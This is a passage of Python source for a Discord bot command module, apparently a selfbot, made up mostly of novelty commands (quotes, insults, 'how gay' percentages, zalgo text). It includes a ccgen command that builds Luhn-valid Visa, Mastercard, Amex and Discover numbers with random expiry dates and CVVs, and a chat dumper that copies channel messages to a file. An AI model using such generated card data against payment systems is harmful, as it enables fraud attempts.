        tts.save(filename)
        await ctx.send(file=discord.File(fp=filename, filename=filename))
        if os.path.exists(filename):
            os.remove(filename)
            
    @React.command(usage="translate <FromLang> <ToLang> <Text>", description="Translates text to a specific language")
    async def translate(ctx, fromlang, tolang, *, text: str):
        try:
            translator = google_translator()
            translate_text = translator.translate(text, lang_tgt=tolang, lang_src=fromlang)
            await ctx.send(translate_text)
        except Exception:
            pass
            
    @React.command(aliases=["chatdump", "chatdumper"], usage="dumpchat <Amount>", description="Saves the channel messages into a file and uploads it")
    async def dumpchat(ctx, amount_of_messages=50):
        if 100 < amount_of_messages:
            await ctx.send("Please don't try to fetch over 100 messages. It's dangerous.")
        elif amount_of_messages == 0:
            await ctx.send("Please set message amount to at least 1.")
        else:
            try:
                with open(f"./chat_history.txt", "w", encoding="utf-8") as f:
                    messages = await ctx.channel.history(limit=amount_of_messages).flatten()

                    lines = []
                    for message in reversed(messages):
                        if len(message.content) > 1:
                            lines.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message.author}: {message.content}\n")

                        try:
                            for attachment in message.attachments:
                                lines.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message.author}: {attachment.url}\n")
                        except:
                            pass

                        try:
                            for embed in message.embeds:
                                embed_dict = embed.to_dict()
                                lines.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message.author}: {embed_dict}\n")
                        except Exception as e:
                            pass

                    f.writelines(lines)
            except Exception as e:
                pass

            await ctx.send("Generated chat dump.", file=discord.File(f'./chat_history.txt'))
            
            os.remove('./chat_history.txt')
        
        
    def generate_card(type):
        card_types = ["americanexpress", "visa","mastercard","discover"]

        def prefill(t):
            def_length = 16

            if t == card_types[0]:
                return [3, random.randint(4,7)], 13

            elif t == card_types[1]:
                if t.endswith("16"):
                    return [4], def_length - 1
                else:
                    return [4], 12

            elif t == card_types[2]:
                return [5, random.randint(1,5)], def_length - 2

            elif t == card_types[3]:
                return [6, 0, 1, 1], def_length - 4

            else:
                return [], def_length

        def finalize(nums):
            check_sum = 0
            check_offset = (len(nums) + 1) % 2

            for i, n in enumerate(nums):
                if (i + check_offset) % 2 == 0:
                    n_ = n*2
                    check_sum += n_ -9 if n_ > 9 else n_
                else:
                    check_sum += n
            return nums + [10 - (check_sum % 10) ]

        t = type.lower()
        if t not in card_types:
            return

        initial, rem = prefill(t)
        so_far = initial + [random.randint(1,9) for x in range(rem - 1)]
        return "".join(map(str,finalize(so_far)))

    def random_digits(digits):
        lower = 10**(digits-1)
        upper = 10**digits - 1
        return random.randint(lower, upper)
        
    @React.command(usage="ccgen [Mastercard/Visa/Amex/Discover]", description="Generates a fake credit card")
    async def ccgen(ctx, cardtype: str='mastercard'):
        try:            
            if cardtype.lower() == 'mastercard':
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Credit Card Generator',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.add_field(name=f'__üí≥ Credit Card Number__', value=f'{generate_card("mastercard")}', inline=True)
                embed.add_field(name=f'__‚è± Expiration Date__', value=f'{random.randint(10, 12)}/{random.randint(2021, 2026)}', inline=True)
                embed.add_field(name=f'__üöÄ CVV2__', value=random_digits(3), inline=True)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            elif cardtype.lower() == 'visa':
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Credit Card Generator',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.add_field(name=f'__üí≥ Credit Card Number__', value=f'{generate_card("visa")}', inline=True)
                embed.add_field(name=f'__‚è± Expiration Date__', value=f'{random.randint(10, 12)}/{random.randint(2021, 2026)}', inline=True)
                embed.add_field(name=f'__üöÄ CVV2__', value=random_digits(3), inline=True)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            elif cardtype.lower() == 'amex':
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Credit Card Generator',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.add_field(name=f'__üí≥ Credit Card Number__', value=f'{generate_card("americanexpress")}', inline=True)
                embed.add_field(name=f'__‚è± Expiration Date__', value=f'{random.randint(10, 12)}/{random.randint(2021, 2026)}', inline=True)
                embed.add_field(name=f'__üöÄ CVV2__', value=random_digits(3), inline=True)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            elif cardtype.lower() == 'discover':
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Credit Card Generator',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.add_field(name=f'__üí≥ Credit Card Number__', value=f'{generate_card("discover")}', inline=True)
                embed.add_field(name=f'__‚è± Expiration Date__', value=f'{random.randint(10, 12)}/{random.randint(2021, 2026)}', inline=True)
                embed.add_field(name=f'__üöÄ CVV2__', value=random_digits(3), inline=True)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


                
        except Exception:
            return


    @React.command(usage="fliptext <Text>", description="Flips the text upside down")
    async def fliptext(ctx, *, text: str):
        
        await ctx.send(upsidedown.transform(text))

    @React.command(usage="howgay <User>", description="Shows how gay a user is")
    async def howgay(ctx, *, user: discord.User=None):
        
        if user is None:
            member = ctx.author
        else:
            member = user

        random.seed(member.id)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'How Gay is {member}', description=f'{member} is { random.randint(0, 100) }% Gay!',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="howcorona <User>", description="Shows how corona positive a user is")
    async def howcorona(ctx, *, user: discord.User=None):
        
        if user is None:
            member = ctx.author
        else:
            member = user

        random.seed((member.id * 6) / 2)
        percent = random.randint(0, 100)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Corona Test', description=f'{member} is {percent}% Corona positive!\n\nOverall: {"**Positive**" if (percent > 50) else "**Negative**"}',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
        
    @React.command(usage="howcap <User>", description="Shows if a user is capping")
    async def howcap(ctx, *, user: discord.User=None):
        
        if user is None:
            member = ctx.author
        else:
            member = user

        random.seed((member.id * 4.5) / 2)
        percent = random.randint(0, 100)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'How Cap', description=f'{member} is {percent}% capping!',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="lovecalc <User 1> <User 2>", description="Love Calculator between two users")
    async def lovecalc(ctx, user1: discord.User, user2: discord.User):

        random.seed((user1.id + user2.id) / 2)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Love Calculator', description=f'{user1} and {user2} are { random.randint(0, 100) }% compatible!',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="iq <User>", description="Shows User's IQ")
    async def iq(ctx, *, user: discord.User=None):
        
        if user is None:
            member = ctx.author
        else:
            member = user

        random.seed(member.id * 3)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'IQ Test', description=f'{member}\'s IQ is { random.randint(30, 140) }!',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="insult <User>", description="Insults an user")
    async def insult(ctx, *, user: discord.User=None):
        if user is None:
            member = ctx.author
        else:
            member = user

        insult = requests.get(f'https://insult.mattbas.org/api/insult')    
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Insult for {member}', description=f'> {member}, {insult.content.decode("ascii")}',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="trumpquote", description="Shows a random Donald Trump quote")
    async def trumpquote(ctx):
        info = requests.get(f'https://tronalddump.io/random/quote')    
        quote = info.json()['value']
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Donald Trump Quote', description=f'> {quote}',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    # @React.command()
    # async def quote(ctx):
    #     info = requests.get(f'https://no-api-key.com/api/v1/quotes')    
    #     quote = info.json()['quote']
    #     author = info.json()['author']
        
    #     embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Quote', description=f'> {quote} \n- {author}',timestamp=embed_timestamp())
    #     embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    @React.command(usage="kanyequote", description="Generates a random Kanye West quote")
    async def kanyequote(ctx):
        info = requests.get(f'https://api.kanye.rest/')    
        quote = info.json()['quote']
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Kanye West Quote', description=f'> {quote}',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="chucknorrisjoke", description="Tells a Chuck Norris joke")
    async def chucknorrisjoke(ctx):
        info = requests.get(f'https://api.chucknorris.io/jokes/random')    
        joke = info.json()['value']
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Chuck Norris Joke', description=f'{joke}',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="texttobinary <Text>", description="Converts text to binary")
    async def texttobinary(ctx, *, text):
        info = requests.get(f'https://no-api-key.com/api/v1/binary?text={urllib.parse.quote(text)}')    
        binary_text = info.json()['binary']
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Text to Binary',timestamp=embed_timestamp())
        embed.add_field(name = "Text", value = f"{text}")
        embed.add_field(name = "Binary", value = f"{binary_text}")
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="binarytotext <Binary>", description="Converts binary to text")
    async def binarytotext(ctx, *, binary):
        info = requests.get(f'https://no-api-key.com/api/v1/binary-text?binary={urllib.parse.quote(binary)}')    
        text = info.json()['text']
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Binary to Text',timestamp=embed_timestamp())
        embed.add_field(name = "Binary", value = f"{binary}")
        embed.add_field(name = "Text", value = f"{text}")
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="howfurry <User>", description="Shows how forry a user is")
    async def howfurry(ctx, *, user: discord.User=None):
        
        if user is None:
            member = ctx.author
        else:
            member = user

        random.seed(member.id * 2)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'How Furry is {member}', description=f'{member} is { random.randint(0, 100) }% a Furry!',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)




    def zalgoText(string):
        result = ''

        for char in string:
            for i in range(0, random.randint(20, 40)):
                randBytes = random.randint(0x300, 0x36f).to_bytes(2, 'big')
                char += randBytes.decode('utf-16be')
                i + 1
            result += char
        return result

    @React.command(usage="zalgo <Text>", description="Adds Zalgo characters to a Text")
    async def zalgo(ctx, *, text: str):
        
        await ctx.send(zalgoText(text))

    @React.command(usage="amazonsearch <Product>", description="Searches Amazon products")
    async def amazonsearch(ctx, *, product: str):
        
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Amazon Search Results', description=f'Here are your search results for [{product}](https://amazon.com/s?k={urllib.parse.quote(product)})',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="revavatar <User>", description="Reverse Avatar Search")
    async def revavatar(ctx, *, user: discord.User):
        try:
